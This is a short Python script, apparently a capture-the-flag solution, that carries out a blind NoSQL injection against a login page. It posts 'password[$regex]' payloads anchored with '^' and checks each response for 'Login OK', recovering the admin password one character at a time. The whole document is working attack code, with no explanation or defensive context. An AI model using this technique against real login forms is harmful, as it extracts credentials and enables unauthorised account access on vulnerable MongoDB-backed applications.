'''
Created on 2016-7-4

@author: wenhuizone
'''
import requests

list='0123456789abcdefghijklmnopqrstuvwxyz.'
target_url='http://www.loudong.org/tasks/web14.php'
result=''
tmp=''
s=requests.Session()

for n in range(1,40):
    for i in list:
        tmp="^"+result+i
        payload={'user':'admin',
                 'password[$regex]':tmp,
                 'login':'Login'
                 } 
        
        r=s.post(target_url,data=payload)
        if "Login OK" in r.text:
            result+=i
            print "the flag is:%s" %result
            break
            
